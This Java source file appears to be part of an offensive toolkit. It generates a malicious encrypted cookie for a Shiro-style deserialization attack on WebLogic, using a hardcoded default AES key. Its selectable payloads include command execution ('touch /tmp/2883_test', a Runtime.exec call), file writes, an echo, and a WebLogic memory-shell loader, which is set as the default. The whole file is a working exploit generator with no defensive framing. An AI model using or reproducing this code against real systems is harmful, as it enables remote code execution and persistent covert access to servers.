package com.feihong;

import com.feihong.encrypt.AESEncrypt;
import com.feihong.encrypt.GCMEncrypt;
import com.feihong.enumeration.EncryptMode;
import com.feihong.enumeration.PayloadType;
import com.feihong.payload.*;
import com.feihong.template.BasicCmdTemplate;
import com.feihong.template.WeblogicEcho;
import com.feihong.template.WeblogicMemshellLoader;


public class GenerateCookie {
    public static void main(String[] args) throws Exception {
        String key = "kPH+bIxk5D2deZiIxcaaaA==";

        byte[] payload;
        String cookie;
        PayloadType type = PayloadType.Memshell;
        EncryptMode mode = EncryptMode.AES;

        switch(type){
            case Cmd:
                payload = BasicCMDpayload.generate("/tmp/2555");
                break;
            case Cmd2883:
                payload = BasicCMDpayload_2883.generate("touch /tmp/2883_test");
                break;
            case FileOutputStreamTest:
                payload = FileWritePayload.generate("poc.txt", "It works!");
                break;
            case TemplatesImplTest:
                payload = TemplatesImplPayload.generate("java.lang.Runtime.getRuntime().exec(\"calc\");");
                break;
            case Echo:
                payload = ScriptEnginePayload.generate(WeblogicEcho.class);
                break;
            case Echo2883:
                payload = ScriptEnginePayload_2883.generate(WeblogicEcho.class);
                break;
            case Memshell:
                payload = ScriptEnginePayload_2883.generate(WeblogicMemshellLoader.class);
                break;
            default:
                throw new RuntimeException("Not Supported Payload Type");
        }


        switch(mode){
            case AES:
                cookie = AESEncrypt.encrypt(key, payload);
                break;
            case GCM:
                cookie = GCMEncrypt.encrypt(key, payload);
                    break;
            default:
                throw new RuntimeException("Not Supperted Encrypt Mode");
        }

        System.out.println("Size: " + cookie.length());
        System.out.println(cookie);
    }
}
